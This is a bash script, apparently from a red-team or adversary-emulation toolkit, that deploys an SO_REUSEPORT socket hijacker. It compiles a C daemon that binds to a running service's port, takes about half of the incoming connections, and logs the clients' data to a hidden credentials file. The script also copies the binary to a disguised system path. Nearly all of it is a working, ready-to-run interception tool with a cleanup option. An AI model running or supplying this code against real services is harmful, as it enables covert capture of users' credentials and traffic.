#!/bin/bash
# T1557 — Adversary-in-the-Middle: SO_REUSEPORT Socket Hijacking
# Bind alongside a running service and steal a portion of connections

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_reuseport"
WORKDIR="/tmp/.${MARKER}"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1557 — SO_REUSEPORT Socket Hijacking       ║"
    echo "  ║   Steal connections from running services      ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

deploy_reuseport() {
    echo -e "${CYAN}[*] Deploying SO_REUSEPORT hijacker${NC}"

    echo -e "${YELLOW}[*] SO_REUSEPORT (Linux 3.9+) allows multiple sockets to bind to the same port."
    echo -e "    The kernel load-balances incoming connections across all bound sockets."
    echo -e "    Requirement: same effective UID as the target service (or root).${NC}"
    echo ""

    read -p "  Target port to hijack (e.g., 22, 80, 3306): " PORT
    [[ -z "$PORT" ]] && PORT="22"
    read -p "  Log file for captured data [/tmp/.${MARKER}_creds]: " LOGFILE
    [[ -z "$LOGFILE" ]] && LOGFILE="/tmp/.${MARKER}_creds"

    if ! command -v gcc &>/dev/null; then
        echo -e "${RED}[!] gcc required${NC}"; return
    fi

    mkdir -p "$WORKDIR"
    cat > "${WORKDIR}/hijack.c" << CEOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>

#define PORT ${PORT}

int main(int argc, char *argv[]) {
    const char *logfile = "${LOGFILE}";
    if (argc > 1) logfile = argv[1];

    signal(SIGCHLD, SIG_IGN);
    daemon(0, 0);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 1;

    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(PORT),
        .sin_addr.s_addr = INADDR_ANY
    };

    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        return 1;
    }
    listen(sock, 128);

    while (1) {
        struct sockaddr_in client;
        socklen_t clen = sizeof(client);
        int conn = accept(sock, (struct sockaddr *)&client, &clen);
        if (conn < 0) continue;

        if (fork() == 0) {
            close(sock);
            char buf[4096];
            int n = read(conn, buf, sizeof(buf) - 1);
            if (n > 0) {
                buf[n] = 0;
                FILE *f = fopen(logfile, "a");
                if (f) {
                    time_t now = time(NULL);
                    fprintf(f, "[%s] %s:%d → %s\n",
                        ctime(&now), inet_ntoa(client.sin_addr),
                        ntohs(client.sin_port), buf);
                    fclose(f);
                }
            }
            close(conn);
            _exit(0);
        }
        close(conn);
    }
    return 0;
}
CEOF

    gcc -o "${WORKDIR}/hijack" "${WORKDIR}/hijack.c" 2>/dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}[!] Compilation failed${NC}"
        return
    fi

    cp "${WORKDIR}/hijack" /usr/lib/.libport_helper
    chmod 755 /usr/lib/.libport_helper

    # Check if we can bind (same UID check)
    /usr/lib/.libport_helper "$LOGFILE" &
    sleep 1

    if pgrep -f "libport_helper" &>/dev/null; then
        echo -e "${GREEN}[+] SO_REUSEPORT hijacker active on port ${PORT}${NC}"
        echo -e "${GREEN}[+] Captured data logged to: ${LOGFILE}${NC}"
        echo -e "${YELLOW}[*] ~50% of new connections will be intercepted${NC}"
        echo -e "${YELLOW}[*] Legitimate service continues working (other 50%)${NC}"
    else
        echo -e "${RED}[!] Failed to bind — same UID required (try as root or service user)${NC}"
    fi
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up SO_REUSEPORT hijacker...${NC}"

    pkill -f "libport_helper" 2>/dev/null
    rm -f /usr/lib/.libport_helper
    rm -f "/tmp/.${MARKER}_creds"
    rm -rf "$WORKDIR"

    echo -e "${GREEN}[+] SO_REUSEPORT hijacker removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Deploy SO_REUSEPORT hijacker"
    echo -e "  ${CYAN}[2]${NC} Cleanup"
    echo ""
    read -p "Choose [1-2]: " OPT

    case "$OPT" in
        1) deploy_reuseport ;;
        2) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
